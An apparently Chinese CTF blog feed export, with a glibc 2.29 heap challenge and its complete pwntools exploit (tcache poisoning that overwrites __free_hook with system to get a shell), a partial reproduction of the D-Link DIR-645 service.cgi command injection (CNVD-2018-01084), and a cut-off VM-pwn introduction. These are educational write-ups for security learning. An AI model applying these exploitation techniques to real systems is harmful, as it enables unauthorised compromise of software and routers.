class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">	buf[result] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, index = <span class="number">-1</span>, i, result;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!nodes[i]) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">	size = get_int();</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0x400</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	result = read_n(nodes[index], size);</span><br><span class="line">	<span class="keyword">if</span> (nodes[index][result - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">		nodes[index][result - <span class="number">1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	index = get_int();</span><br><span class="line">	<span class="keyword">if</span> (index &gt;= LENGTH || !nodes[index]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(nodes[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nodes[i]) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index %d: %s\n&quot;</span>, i, nodes[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	inital();</span><br><span class="line">	welcome();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> choice = get_int();</span><br><span class="line">		<span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			add();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			delete();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			show();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o pwn1 pwn1.c  glibc-2.29 ubuntu18.04</span></span><br></pre></td></tr></table></figure>



<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment">##get </span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">heap = data - <span class="number">0x260</span></span><br><span class="line">lg(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#9-15</span></span><br><span class="line"><span class="comment">##此时tcachebins为空，当再次申请chunk会将fastbins的chunk放入tcachebins中</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(heap+<span class="number">0x10</span>))<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#18</span></span><br><span class="line"><span class="comment">##设置tcache_perthread_struct chunk的size对应的tcachebins为0xff，即让系统认为tcachebins中这个size处，已经满了</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#19</span></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;main_arena+96&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##malloc出来tcache_perthread_struct chunk使用去修改tcache_entry指针实现任意malloc</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))<span class="comment">#20</span></span><br><span class="line"><span class="comment">##这段代码就是改tcachebins的0x20处的next指针指向__free_hook</span></span><br><span class="line"><span class="comment">##申请出上面这个0x20大小的chunk，改__free_hook为system</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#21</span></span><br><span class="line"><span class="comment">##b&#x27;/bin/sh\x00&#x27;覆盖了libc_base+libc.sym[&#x27;__free_hook&#x27;]-8，system覆盖了__free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ol>
<li>tcache中的偏移，与存放chunk_size的大小</li>
</ol>
<p>疑问一：为什么这里<code>payload = b&#39;\x00&#39;*0x23+b&#39;\xff&#39;</code></p>
<p>在此处pwndbg中，tcache_prethread_struct的chunk内存，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x00000000ff000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这一块内存记录的是tcachebins中对应size的chunk的数量，在0xff前面有0x23个\x00,它们记录了从0x10 - 0x240size的chunk，0xff的位置记录的是0x250大小的chunk,由于0xff导致0x250[-1]，以至于系统认为此处的chunk已满</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  0]: 0x10000000000</span><br><span class="line">0x250 [ -1]: 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关于这个前0x40的内存，这里可以参考源码：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//64 = 0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//后面的就是tcache_entry,即每个tcachebins中记录的chunk_memptr</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>



<p>疑问二：<code>b&#39;\x00&#39;*0x40+p64(libc_base+libc.sym[&#39;__free_hook&#39;]-8)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000101</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这些应该是记录tcachebins中每个size对应chunk的数量</span></span><br><span class="line"><span class="comment">#从这里开始往下应该是记录了每个size的chunk_memptr,最小的是0x20</span></span><br><span class="line">0x555555606050: 0x00007ffff7fc65a0      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p>ctf-wiki，<a href="https://nightrainy.github.io/">知世</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始复现CNVD-2018-01084</title>
    <url>/2025/09/06/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0CNVD-2018-01084/</url>
    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>笔者复现的环境是<code>Ubuntu 22.04(wsl2)</code>，ida9.0</p>
<p><strong>配置mips架构的运行环境：</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips-linux-gnu</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mipsel-linux-gnu</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure>

<p>安装<code>qemu、binwalk、sasquatch、gdb-multiarch</code>等工具</p>
<p>参考：安装<a href="https://blog.csdn.net/CROWPSYCHO/article/details/137226862">sasquatch在22.04等高版本Ubuntu、kali中的安装错误</a>解决方案</p>
<p>漏洞固件 Firmware:<a href="https://ftp.dlink.ru/pub/Router/DIR-645/Firmware/Old/">DIR-645_A1_FW: v1.02b08 (for WW) </a>（tw官网选择 DIR-645 第一个文件）版本号为 v1.02（v1.03完成修复）</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="定位漏洞文件"><a href="#定位漏洞文件" class="headerlink" title="定位漏洞文件"></a>定位漏洞文件</h2><h3 id="根据官方公告，找到存在漏洞的二进制文件"><a href="#根据官方公告，找到存在漏洞的二进制文件" class="headerlink" title="根据官方公告，找到存在漏洞的二进制文件"></a>根据官方公告，找到存在漏洞的二进制文件</h3><p>官方公告</p>
<p><img data-src="/../images/image-20250906164255939.png" alt="image-20250906164255939"></p>
<p><strong>提取固件：</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">binwalk -eM DIR645A1_FW102B08.bin</span><br></pre></td></tr></table></figure>

<p>在解压提取固件时可能在提取出来的文件夹中没有内容，是因为sasquatch这个没安装</p>
<p>根据“漏洞描述”中的关键词<code>service.cgi</code>进行查找：</p>
<p><img data-src="/../images/image-20250906163314353.png" alt="image-20250906163314353"></p>
<p>在图中就可以看出漏洞文件位于<code>./htdocs/cgibin</code>，将其拖进<code>IDA</code>中先进行静态分析。</p>
<h3 id="对二进制文件进行静态分析"><a href="#对二进制文件进行静态分析" class="headerlink" title="对二进制文件进行静态分析"></a>对二进制文件进行静态分析</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main()函数"></a>main()函数</h4><p>先看一下开头的代码</p>
<p><img data-src="/../images/image-20250906165244464.png" alt="image-20250906165244464"></p>
<ol>
<li><p><strong><code>v3 = *argv;</code></strong></p>
<ul>
<li><code>argv</code> 是一个指向程序启动参数字符串数组的指针。</li>
<li><code>*argv</code> (等同于 <code>argv[0]</code>) <strong>永远是程序自身的完整路径和名称</strong>。</li>
<li>所以，<code>v3</code> 现在的值是程序的完整路径，例如 <code>&quot;/htdocs/cgibin&quot;</code>。</li>
</ul>
</li>
<li><p><strong><code>v6 = strrchr(*argv, 47);</code></strong></p>
<ul>
<li><code>strrchr</code> 是一个C语言函数，用于在字符串中查找<strong>最后一个</strong>出现的指定字符。</li>
<li><code>47</code> 是字符 <strong><code>/</code></strong> 的ASCII码值。</li>
<li>这行代码的作用是：在程序路径 <code>&quot;/htdocs/cgibin&quot;</code> 中，从后往前找，找到最后一个 <code>/</code>。</li>
<li>执行后，<code>v6</code> 会指向这个 <code>/</code> 字符。</li>
</ul>
</li>
<li><p><strong><code>if ( v6 ) v3 = v6 + 1;</code></strong></p>
<ul>
<li><code>if (v6)</code> 判断是否找到了 <code>/</code>。如果找到了，<code>v6</code> 就不是空指针(NULL)。</li>
<li><code>v3 = v6 + 1;</code> 如果找到了 <code>/</code>，那么 <code>v6 + 1</code> 就指向了 <code>/</code> 后面的第一个字符。</li>
<li>这 cleverly 的一步操作，就是<strong>从完整路径中提取出程序的文件名</strong>。</li>
<li>例如，如果 <code>v3</code> 原本是 <code>&quot;/htdocs/cgibin&quot;</code>，执行后 <code>v3</code> 就变成了 <code>&quot;cgibin&quot;</code>。</li>
</ul>
</li>
<li><p><strong><code>if ( !strcmp(v3, &quot;scandir.sgi&quot;) )</code></strong></p>
<ul>
<li><code>strcmp</code> 是字符串比较函数。如果两个字符串完全相同，它返回 <code>0</code>。</li>
<li><code>!</code> 是逻辑非操作符，<code>!0</code> 的结果是 <code>true</code>。</li>
<li>所以，这行代码的意思是：<strong>判断程序的文件名是不是等于 <code>&quot;scandir.sgi&quot;</code></strong>。</li>
</ul>
</li>
</ol>
<p>在main函数中<code>Ctrl+F</code>直接搜即可找到对应关键字<code>&quot;service.cgi&quot;</code></p>
<p><img data-src="/../images/image-20250906164553853.png" alt="image-20250906164553853"></p>
<p>当传入的第一个参数是<code>service.cgi</code>，比对成功后，会进入<code>servicecgi_main</code>函数。</p>
<p><strong>return (phpcgi_main_1)(argc_1, argv, envp);</strong></p>
<ul>
<li><strong>执行跳转</strong>：程序立即调用刚刚赋值的函数指针，也就是<strong>直接跳转去执行 servicecgi_main 函数</strong>，并将所有的命令行参数和环境变量都传递给它。</li>
</ul>
<h4 id="servicecgi-main-函数"><a href="#servicecgi-main-函数" class="headerlink" title="servicecgi_main()函数"></a>servicecgi_main()函数</h4><p><strong>跟进servicecgi_main()函数</strong></p>
<p>打开它的汇编代码，我们先对<code>servicecgi_main</code>这个函数整体的调用路线进行一个宏观的分析：</p>
<p><img data-src="/../images/image-20250906172558242.png" alt="image-20250906172558242"></p>
<p>我们猜测漏洞点存在于这里的<code>system</code>函数处，它是由<code>lxmldbc_system</code>函数调用的：</p>
<p><img data-src="/../images/image-20250906173010200.png" alt="image-20250906173010200"></p>
<p>在<code>lxmldbc_system</code>函数中，会先进行一个<strong>格式化字符串</strong>的拼接，再将拼接好的字符串作为<code>system</code>的参数调用，因此，这里的确可能存在一个可被利用的点：</p>
<p><strong>回到servicecgi_main()函数中</strong></p>
<p><img data-src="/../images/image-20250906173514879.png" alt="image-20250906173514879"></p>
<p><strong>strcasecmp(s1, s2)的返回值</strong></p>
<table>
<thead>
<tr>
<th align="left">比较 <code>strcasecmp(s1, s2)</code></th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">s1 等于 s2</td>
<td align="left"><code>0</code></td>
</tr>
<tr>
<td align="left">s1 小于 s2</td>
<td align="left"><code>&lt; 0</code></td>
</tr>
<tr>
<td align="left">s1 大于 s2</td>
<td align="left"><code>&gt; 0</code></td>
</tr>
</tbody></table>
<p>首先获取了环境变量<code>REQUEST_METHOD</code>进行判断：</p>
<ul>
<li>当为POST请求时，将n1024设置为1024</li>
<li>当处理不为GET请求时，他会跳转到LABEL_10，而这个LABEL_10位于<code>lxmldbc_system()</code>下方</li>
</ul>
<p><img data-src="/../images/image-20250906173841821.png" alt="image-20250906173841821"></p>
<p>所以，为了利用到<code>lxmldbc_system</code>中的漏洞，我们的<strong>请求方式只能为<code>POST</code></strong>。</p>
<h4 id="cgibin-parse-request-函数"><a href="#cgibin-parse-request-函数" class="headerlink" title="cgibin_parse_request()函数"></a>cgibin_parse_request()函数</h4><p>在servicecgi_main()中如下位置跟进</p>
<p><img data-src="/../images/image-20250906174147327.png" alt="image-20250906174147327"></p>
]]></content>
      <categories>
        <category>iot</category>
        <category>cve</category>
      </categories>
      <tags>
        <tag>iot</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>vmpwn</title>
    <url>/2025/05/02/vmpwn/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>vmpwn常见设计</p>
<ul>
<li>初始化分配模拟寄存器空间</li>
<li>初始化模拟栈空间</li>
<li>初始化分配模拟数据存储（buffer）空间 （data段）</li>
<li>初始化伪OPCODE空间 （text段）</li>
</ul>
<p>常见流程</p>
<ul>
<li>输入opcode</li>
<li>有一个分析器，循环分解我们输入的opcode来翻译出汇编指令，多为出入栈和调用寄存器</li>
<li>一般漏洞都在<strong>越界写和越界读</strong>之类的。</li>
</ul>
<p>几个寄存器需要了解：</p>
<ol>
<li><code>PC</code>程序计数器，存放的是一个内存地址，该地址中存放着下一条要执行的计算机指令；</li>
<li><code>SP</code>指针寄存器，永远指向当前栈顶</li>
<li><code>BP</code>基址寄存器，用于指向栈的某些地址，在调用函数的时候会用到</li>
<li><code>AX</code>通用寄存器，用于存放一条指令执行后的结果</li>
</ol>
<p><strong>关于opcode</strong></p>
<p>程序是怎么执行指令的？在编译的时候，编译器会将代码转化为汇编代码然后根据操作系统规定的规则进行机器码的一一对应置换，操作系统通过识别机器码去执行对应的操作。比如说随便取一个程序的一段汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000007DA                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:00000000000007DF                 lea     rsi, buf        ; buf</span><br><span class="line">.text:00000000000007E6                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000000007EB                 mov     eax, 0</span><br><span class="line">.text:00000000000007F0                 call    _read</span><br></pre></td></tr></table></figure>

<p>在Hex View-1窗口中看到的视图是这样的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00000000000007D0  00 00 48 89 C7 E8 96 FE  FF FF BA 64 00 00 00 48  ..H........d...H</span><br><span class="line">00000000000007E0  8D 35 5A 08 20 00 BF 00  00 00 00 B8 00 00 00 00  .5Z. ...........</span><br><span class="line">00000000000007F0  E8 5B FE FF FF 48 8D 35  B8 00 00 00 48 8D 3D 3D  .....H.5....H.==</span><br></pre></td></tr></table></figure>

<p>如果我们按照地址一一对应的话，就可以得到这样的对应关系：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BA 64 00 00 00            mov     edx, 64h</span><br><span class="line">48 8D 35 5A 08 20 00      lea     rsi, buf</span><br><span class="line">BF 00 00 00 00            mov     edi, 0</span><br><span class="line">B8 00 00 00 00            mov     eax, 0</span><br><span class="line">E8 5B FE FF FF            call    _read</span><br></pre></td></tr></table></figure>

<p>这样的机制同样是使用与vmpwn的程序中的，左侧的二进制码就可以称为<strong>opcode</strong></p>
<p>还有就是vm程序在运行过程中输出字符串的时候，我们在编程的时候会有写像这样的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,buf);</span><br></pre></td></tr></table></figure>

<p>buf中存储的是字符串的地址，这样来输出字符串，但是我们不能写成下面这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="string">&#x27;hello world!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>像这样的一个字符串按照编译的知识，它应该被存储在data段这样的数据存储区。</p>
<p>所以说我们在制作一个简单的VM，就需要具备一个程序应该有的一些结构和空间。比如：寄存器，栈，缓冲区域等。我们可以根据自己喜欢的方式来写属于自己的函数调用约定，写自己喜欢的存储方式。那么总结一下vm就是利用编写程序来实现模拟寄存器、stack、数据缓冲区来实现执行自己定义的虚拟指令（可能不太准确。</p>
<p>vmpwn大概就是利用程序规定的虚拟指令，来利用程序中的漏洞。</p>
<p>下面看几个名词解释：</p>
<p>虚拟机保护技术：所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。这段用于翻译伪代码并负责具体执行的子程序就叫作虚拟机VM（好似一个抽象的CPU）。它以一个函数的形式存在，函数的参数就是字节码的内存地址。</p>
<p>VStartVM：虚拟机的入口函数，对虚拟机环境进行初始化。</p>
<p>VMDispather：解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。</p>
<p>opcode：程序可执行代码转换成的操作码。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="iscc2025擂台-vm-pwn"><a href="#iscc2025擂台-vm-pwn" class="headerlink" title="[iscc2025擂台]vm_pwn"></a>[iscc2025擂台]vm_pwn</h2><p>开逆：</p>
<h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);                     <span class="comment">// 0x4090</span></span><br><span class="line">  sp_ = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);                      <span class="comment">// 0x40a0</span></span><br><span class="line">  bp_ = sp_ + <span class="number">0x8000</span>;                           <span class="comment">// 0x4088 = 0x40a0 + 0x8000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter bytecode: &quot;</span>);</span><br><span class="line">  ax_ = read(<span class="number">0</span>, heap, <span class="number">0x1000u</span>LL);               <span class="comment">// 0x4098</span></span><br><span class="line">  execute(reg);                                 <span 